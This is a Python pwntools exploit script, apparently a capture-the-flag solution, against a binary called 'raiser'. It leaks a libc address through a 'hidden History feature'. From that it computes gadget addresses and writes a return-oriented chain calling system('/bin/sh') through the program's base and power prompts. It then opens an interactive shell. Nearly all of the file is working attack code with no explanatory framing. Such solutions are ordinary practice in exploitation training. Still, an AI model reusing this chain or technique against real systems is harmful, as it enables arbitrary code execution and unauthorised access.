#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template raiser
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'raiser')
context.log_level = 'debug'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'$ORIGIN'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.sendlineafter(b"Enter base:", b"1337")
io.sendlineafter(b"Enter power:", b"19") 

io.recvuntil(b"You found the hidden History feature!\n")
data = io.recvline().strip()
base = int(data) - 0x28150

pop_rdi = str(base + 0x0000000000028795)
bin_sh = str(base + 0x1c041b)
system = str(base + 0x552b0)

ret = str(base + 0x0000000000026a3e)

print("DENUGGG", base)

for i in range(19):
    io.sendlineafter(b"Enter base:", b"1")
    io.sendlineafter(b"Enter power:", b"1")
    
    
io.sendlineafter(b"Enter base:", ret)
io.sendlineafter(b"Enter power:", b"1")

io.sendlineafter(b"Enter base:", pop_rdi)
io.sendlineafter(b"Enter power:", b"1")

io.sendlineafter(b"Enter base:", bin_sh)
io.sendlineafter(b"Enter power:", b"1")

io.sendlineafter(b"Enter base:", system)
io.sendlineafter(b"Enter power:", b"1")


io.sendlineafter(b"Enter base:", b"1")
io.sendlineafter(b"Enter power:", b"5000")


io.interactive()

